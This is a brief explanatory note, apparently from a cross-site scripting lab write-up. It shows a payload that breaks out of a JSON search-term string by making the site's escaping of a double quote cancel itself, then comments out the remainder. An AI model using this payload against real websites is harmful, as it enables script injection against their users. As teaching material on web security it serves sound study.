payload => `\"-alert(1)}//

result =>
```javascript
"{"results":[],"searchTerm":"\\"-alert(1)}// "}" -> this gets commented
                              |
                              V
                This scape character gets cancelled by another slash (\) because the double quotes (") character triggers the scape character sanitization.       
```